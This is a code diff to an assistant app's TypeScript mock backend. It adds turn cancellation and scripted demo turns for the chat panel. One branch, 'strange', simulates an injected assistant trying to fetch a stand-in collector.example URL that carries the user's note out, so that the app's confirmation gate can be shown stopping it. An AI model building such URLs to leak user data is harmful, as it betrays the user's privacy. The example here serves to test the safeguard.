@@ -4894,7 +4894,12 @@ export const mockInvoke = async <T>(
 
     case 'list_conversations': {
       requireUnlocked()
+      // A run's transcript is a conversation too, and is left out unless
+      // asked for -- as the service's `chats_only` does -- so the history
+      // list is the person's own conversations, not every routine's.
+      const ofRuns = new Set(runs.map((r) => r.conversationId).filter(Boolean))
       const rows = [...conversations]
+        .filter((c) => args.includeRuns === true || !ofRuns.has(c.id))
         .sort((a, b) => b.updatedAt.localeCompare(a.updatedAt))
         .map((c) => ({
           ...c,
@@ -4927,6 +4932,10 @@ export const mockInvoke = async <T>(
     case 'confirm_tool_call':
       requireUnlocked()
       return mockConfirm(str(args.callId), args.approved === true, args.later === true) as T
+
+    case 'cancel_turn':
+      requireUnlocked()
+      return mockCancel(str(args.conversationId)) as T
 
     case 'list_memories':
       requireUnlocked()
@@ -5662,12 +5671,35 @@ function mockConfirm(callId: string, approved: boolean, later: boolean): boolean
 const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms))
 
 /**
+ * Turns the scripted assistant is in the middle of, by conversation, and how
+ * to stop each -- what `cancel_turn` reaches for.
+ */
+const mockRunning = new Map<string, { stopped: boolean; wake: () => void }>()
+
+function mockCancel(conversationId: string): boolean {
+  const run = mockRunning.get(conversationId)
+  if (!run || run.stopped) return false
+  run.stopped = true
+  run.wake()
+  return true
+}
+
+/**
  * A scripted turn.
  *
  * Chosen to walk the panel through every state it has to draw rather than to
  * be convincing: a word-at-a-time reply always, a tool card when the prompt
  * mentions a task, and a confirmation when it mentions deleting. Typing
  * "fail" gets the failure path, which is otherwise the hardest state to see.
+ *
+ * And the long ones, which are what the status line, the plan and Stop are
+ * for: "weather" checks a forecast, "search" or "news" searches and reads a
+ * page, "plan", "trip" or "weekend" does all of it under a plan that ticks
+ * itself off, "think" streams some reasoning first, "slow" thinks for a long
+ * time so there is something to press Stop on, and "strange" asks to open an
+ * address nobody gave it -- the card that stops for that. The web ones answer that
+ * web access is off unless it has been switched on in Settings, as the real
+ * assistant would.
  */
 export async function mockSendMessage(
   conversationId: string,
@@ -5703,116 +5735,310 @@ export async function mockSendMessage(
   const messageId = `msg-${nextId++}`
   onEvent({ type: 'started', messageId })
 
-  const lower = prompt.toLowerCase()
-  if (lower.includes('fail')) {
-    await sleep(300)
-    onEvent({ type: 'failed', message: 'The API key was refused. Check it in Settings.' })
-    return
-  }
-
-  let reply: string
-  if (lower.includes('delet')) {
-    const callId = 'call-mock-delete'
-    onEvent({
-      type: 'confirmationRequired',
-      callId,
-      name: 'delete_task',
-      subject: 'Order the timber',
-      arguments: { task_id: '0192f3a1-mock' },
-      kind: 'destructive',
-      // `delete_task` has a proposal form in the real catalogue -- see
-      // `docs/plans/dreaming.md`'s Phase 5 -- so the mock offers "later" too.
-      canPark: true,
+  // A pause Stop can cut short, and a question Stop withdraws.
+  const run = { stopped: false, wake: () => {} }
+  mockRunning.set(conversationId, run)
+  const pause = (ms: number) =>
+    new Promise<void>((resolve) => {
+      const timer = setTimeout(resolve, ms)
+      run.wake = () => {
+        clearTimeout(timer)
+        resolve()
+      }
     })
-    const answer = await new Promise<MockAnswer>((resolve) => mockPending.set(callId, resolve))
-    if (answer === 'confirm') {
-      onEvent({ type: 'toolStarted', callId, name: 'delete_task', arguments: {} })
-      await sleep(250)
-      onEvent({
-        type: 'toolFinished',
-        callId,
-        name: 'delete_task',
-        ok: true,
-        summary: 'deleted task Order the timber',
-      })
-      reply = 'Deleted "Order the timber".'
-    } else if (answer === 'later') {
-      await sleep(150)
-      onEvent({
-        type: 'toolFinished',
-        callId,
-        name: 'delete_task',
-        ok: false,
-        summary: 'saved as a proposal for later',
-      })
-      reply = 'Left it as a proposal -- decide from the Assistant app whenever you like.'
-    } else {
-      reply = 'Left it alone. What would you like to do instead?'
+  const ask = (callId: string) =>
+    new Promise<MockAnswer>((resolve) => {
+      mockPending.set(callId, resolve)
+      run.wake = () => {
+        mockPending.delete(callId)
+        resolve('decline')
+      }
+    })
+  const toolCalls: AgentMessage['toolCalls'] = []
+  let step = 0
+  /** One tool, start to finish. False once Stop has been pressed. */
+  const tool = async (name: string, args: unknown, ms: number, summary: string) => {
+    if (run.stopped) return false
+    const callId = `call-mock-${++step}`
+    onEvent({ type: 'toolPreparing', callId, name })
+    await pause(Math.min(500, ms / 3))
+    if (run.stopped) return false
+    onEvent({ type: 'toolStarted', callId, name, arguments: args })
+    toolCalls.push({ id: callId, name, arguments: args })
+    await pause(ms)
+    if (run.stopped) return false
+    onEvent({ type: 'toolFinished', callId, name, ok: true, summary })
+    await pause(350)
+    return !run.stopped
+  }
+  const plan = (steps: [string, 'pending' | 'active' | 'done'][]) =>
+    tool('update_plan', { steps: steps.map(([text, status]) => ({ text, status })) }, 120, '')
+  const think = async (text: string) => {
+    for (const chunk of text.split(/(?<=\s)/)) {
+      if (run.stopped) return
+      await pause(30)
+      onEvent({ type: 'thinking', text: chunk })
     }
-  } else if (lower.includes('task') || lower.includes('todo')) {
-    const callId = 'call-mock-list'
-    onEvent({ type: 'toolStarted', callId, name: 'list_tasks', arguments: { open_only: true } })
-    await sleep(350)
-    onEvent({ type: 'toolFinished', callId, name: 'list_tasks', ok: true, summary: '3 results' })
-    // Markdown, because that is what a model answers with whatever it is
-    // asked. A mock that replies in plain prose is a mock in which the panel
-    // cannot be reviewed: the one thing to look at here is whether a list
-    // renders as a list and a command renders as code.
-    reply = [
-      'You have **three** open:',
-      '',
-      '1. Order the timber — *overdue since Monday*',
-      '2. Ring the vet',
-      '3. Book the MOT',
-      '',
-      'Two of them are in `Move house`. Say the word and I will move the third.',
-    ].join('\n')
-  } else if (lower.includes('markdown')) {
-    // Everything the renderer draws, for reviewing it in one screen.
-    reply = [
-      '## What I can format',
-      '',
-      'Prose with **bold**, *italic*, ~~struck out~~ and `inline code`.',
-      '',
-      '- A bullet',
-      '  - and one nested under it',
-      '- [A link](https://example.org)',
-      '',
-      '> A quotation, for something you said earlier.',
-      '',
-      '```sh',
-      'everyday search rain --json',
-      '```',
-      '',
-      '| Shelf | Open |',
-      '| --- | ---: |',
-      '| Books | 4 |',
-      '| Movies | 2 |',
-    ].join('\n')
-  } else {
-    reply = 'This is a scripted reply from the mock backend. There is no model behind it.'
   }
 
-  // Split on whitespace but *keep* it, so the newlines a Markdown reply is
-  // made of survive the streaming. Splitting on ' ' alone joined every line
-  // of a list into one paragraph, which is the exact failure the renderer
-  // exists to fix -- reproduced by the harness meant to demonstrate it.
-  for (const chunk of reply.split(/(?<=\s)/)) {
-    await sleep(35)
-    onEvent({ type: 'delta', text: chunk })
-  }
+  const lower = prompt.toLowerCase()
+  const webOff =
+    'Web access is off for me, so I cannot look that up. You can turn it on in **Settings → Assistant → Let it use the web**.'
+  let reply: string
 
-  agentMessages.push({
-    id: messageId,
-    conversationId,
-    role: 'assistant',
-    content: reply,
-    toolCalls: [],
-    toolCallId: null,
-    failed: false,
-    createdAt: new Date().toISOString(),
-  })
-  onEvent({ type: 'finished', messageId })
+  try {
+    if (lower.includes('fail')) {
+      await pause(300)
+      onEvent({ type: 'failed', message: 'The API key was refused. Check it in Settings.' })
+      return
+    }
+
+    if (lower.includes('delet')) {
+      const callId = 'call-mock-delete'
+      onEvent({
+        type: 'confirmationRequired',
+        callId,
+        name: 'delete_task',
+        subject: 'Order the timber',
+        arguments: { task_id: '0192f3a1-mock' },
+        kind: 'destructive',
+        // `delete_task` has a proposal form in the real catalogue -- see
+        // `docs/plans/dreaming.md`'s Phase 5 -- so the mock offers "later" too.
+        canPark: true,
+      })
+      const answer = await ask(callId)
+      if (run.stopped) {
+        reply = ''
+      } else if (answer === 'confirm') {
+        onEvent({ type: 'toolStarted', callId, name: 'delete_task', arguments: {} })
+        await pause(250)
+        onEvent({
+          type: 'toolFinished',
+          callId,
+          name: 'delete_task',
+          ok: true,
+          summary: 'deleted task Order the timber',
+        })
+        reply = 'Deleted "Order the timber".'
+      } else if (answer === 'later') {
+        await pause(150)
+        onEvent({
+          type: 'toolFinished',
+          callId,
+          name: 'delete_task',
+          ok: false,
+          summary: 'saved as a proposal for later',
+        })
+        reply = 'Left it as a proposal -- decide from Settings → Waiting for you whenever you like.'
+      } else {
+        reply = 'Left it alone. What would you like to do instead?'
+      }
+    } else if (/\b(plan|trip|weekend)\b/.test(lower)) {
+      await think(
+        'They want a weekend worked out. I should see what is already on the calendar, ' +
+          'check the forecast, and find a couple of things worth doing, then put it together.',
+      )
+      const ok =
+        (await plan([
+          ['See what is already on the calendar', 'active'],
+          ['Check the forecast', 'pending'],
+          ['Find things worth doing nearby', 'pending'],
+          ['Put the weekend together', 'pending'],
+        ])) &&
+        (await tool('list_blocks', { from: '2026-10-10', to: '2026-10-11' }, 900, '2 results')) &&
+        (await plan([
+          ['See what is already on the calendar', 'done'],
+          ['Check the forecast', 'active'],
+          ['Find things worth doing nearby', 'pending'],
+          ['Put the weekend together', 'pending'],
+        ])) &&
+        (agentSettings.web
+          ? (await tool('get_weather', { days: 3 }, 1600, '3 days')) &&
+            (await plan([
+              ['See what is already on the calendar', 'done'],
+              ['Check the forecast', 'done'],
+              ['Find things worth doing nearby', 'active'],
+              ['Put the weekend together', 'pending'],
+            ])) &&
+            (await tool(
+              'web_search',
+              { query: 'things to do in Lisbon this weekend' },
+              1800,
+              '5 results',
+            )) &&
+            (await tool(
+              'read_web_page',
+              { url: 'https://www.visitlisboa.com/en/events' },
+              2200,
+              '',
+            )) &&
+            (await plan([
+              ['See what is already on the calendar', 'done'],
+              ['Check the forecast', 'done'],
+              ['Find things worth doing nearby', 'done'],
+              ['Put the weekend together', 'active'],
+            ]))
+          : true)
+      reply = !ok
+        ? ''
+        : agentSettings.web
+          ? [
+              'Here is a weekend that works around what you already have on:',
+              '',
+              '**Saturday** — dry, 22° and sunny',
+              '- Morning: the Feira da Ladra flea market (Tue & Sat, from 9:00)',
+              '- 14:00 — your *Pottery class* (already booked)',
+              '- Evening: sunset at Miradouro da Senhora do Monte',
+              '',
+              '**Sunday** — 60% chance of showers after 15:00',
+              '- Morning walk along the river to Belém before the rain',
+              '- Afternoon indoors: the Gulbenkian is free on Sundays after 14:00',
+              '',
+              'Sources: [visitlisboa.com](https://www.visitlisboa.com/en/events), Open-Meteo.',
+            ].join('\n')
+          : 'You have *Pottery class* on Saturday at 14:00 and nothing on Sunday. ' + webOff
+    } else if (lower.includes('strange') && agentSettings.web) {
+      // The shape a model talked into sending something out would take: an
+      // address it wrote itself, carrying words, that nobody gave it. The
+      // service stops that to ask -- see `ConfirmGate` -- and so does this.
+      const callId = 'call-mock-fetch'
+      const url = 'https://collector.example/save?note=dentist%20on%20friday'
+      await tool('web_search', { query: 'dentist opening hours' }, 900, '5 results')
+      onEvent({
+        type: 'confirmationRequired',
+        callId,
+        name: 'read_web_page',
+        subject: url,
+        arguments: { url },
+        kind: 'fetch',
+        canPark: false,
+      })
+      const answer = await ask(callId)
+      if (answer === 'confirm' && !run.stopped) {
+        onEvent({ type: 'toolStarted', callId, name: 'read_web_page', arguments: { url } })
+        await pause(800)
+        onEvent({ type: 'toolFinished', callId, name: 'read_web_page', ok: true, summary: '' })
+        reply = 'Opened it. There was nothing useful there.'
+      } else {
+        reply = run.stopped ? '' : 'Left that address alone.'
+      }
+    } else if (lower.includes('weather')) {
+      if (!agentSettings.web) {
+        await pause(600)
+        reply = webOff
+      } else {
+        const ok = await tool('get_weather', { days: 3 }, 1500, '3 days')
+        reply = ok
+          ? [
+              'In **Lisbon** this weekend:',
+              '',
+              '| Day | | High | Low | Rain |',
+              '| --- | --- | ---: | ---: | ---: |',
+              '| Sat | Clear sky | 22° | 15° | 0% |',
+              '| Sun | Rain showers | 19° | 14° | 60% |',
+              '',
+              'Saturday is the one for being outside.',
+            ].join('\n')
+          : ''
+      }
+    } else if (/\b(search|news|look up|web)\b/.test(lower)) {
+      if (!agentSettings.web) {
+        await pause(600)
+        reply = webOff
+      } else {
+        const ok =
+          (await tool('web_search', { query: prompt.slice(0, 60) }, 1400, '5 results')) &&
+          (await tool('read_web_page', { url: 'https://en.wikipedia.org/wiki/Lisbon' }, 2000, ''))
+        reply = ok
+          ? 'Here is what I found, mostly from [Wikipedia](https://en.wikipedia.org/wiki/Lisbon): ' +
+            'Lisbon is the capital and largest city of Portugal, on the Tagus estuary.'
+          : ''
+      }
+    } else if (lower.includes('slow')) {
+      await think('Let me think about this carefully. ')
+      await pause(30_000)
+      reply = run.stopped ? '' : 'That took a while.'
+    } else if (lower.includes('think')) {
+      await think(
+        'The question is open-ended. I will consider a few readings before answering, ' +
+          'and pick the most useful one.',
+      )
+      reply = 'Having thought about it: the most useful reading is the simplest one.'
+    } else if (lower.includes('task') || lower.includes('todo')) {
+      const ok = await tool('list_tasks', { open_only: true }, 350, '3 results')
+      // Markdown, because that is what a model answers with whatever it is
+      // asked. A mock that replies in plain prose is a mock in which the panel
+      // cannot be reviewed: the one thing to look at here is whether a list
+      // renders as a list and a command renders as code.
+      reply = ok
+        ? [
+            'You have **three** open:',
+            '',
+            '1. Order the timber — *overdue since Monday*',
+            '2. Ring the vet',
+            '3. Book the MOT',
+            '',
+            'Two of them are in `Move house`. Say the word and I will move the third.',
+          ].join('\n')
+        : ''
+    } else if (lower.includes('markdown')) {
+      // Everything the renderer draws, for reviewing it in one screen.
+      reply = [
+        '## What I can format',
+        '',
+        'Prose with **bold**, *italic*, ~~struck out~~ and `inline code`.',
+        '',
+        '- A bullet',
+        '  - and one nested under it',
+        '- [A link](https://example.org)',
+        '',
+        '> A quotation, for something you said earlier.',
+        '',
+        '```sh',
+        'everyday search rain --json',
+        '```',
+        '',
+        '| Shelf | Open |',
+        '| --- | ---: |',
+        '| Books | 4 |',
+        '| Movies | 2 |',
+      ].join('\n')
+    } else {
+      await pause(500)
+      reply = 'This is a scripted reply from the mock backend. There is no model behind it.'
+    }
+
+    // Split on whitespace but *keep* it, so the newlines a Markdown reply is
+    // made of survive the streaming. Splitting on ' ' alone joined every line
+    // of a list into one paragraph, which is the exact failure the renderer
+    // exists to fix -- reproduced by the harness meant to demonstrate it.
+    let said = ''
+    for (const chunk of reply.split(/(?<=\s)/)) {
+      if (run.stopped) break
+      await pause(35)
+      if (run.stopped) break
+      said += chunk
+      onEvent({ type: 'delta', text: chunk })
+    }
+
+    // As the service does: a stopped turn keeps what it had said, and one
+    // that had said and done nothing leaves nothing behind.
+    if (said || toolCalls.length > 0) {
+      agentMessages.push({
+        id: messageId,
+        conversationId,
+        role: 'assistant',
+        content: said,
+        toolCalls,
+        toolCallId: null,
+        failed: false,
+        createdAt: new Date().toISOString(),
+      })
+    }
+    onEvent({ type: 'finished', messageId })
+  } finally {
+    mockRunning.delete(conversationId)
+  }
 }
 
 export function mockMediaUrl(blob: string): string {
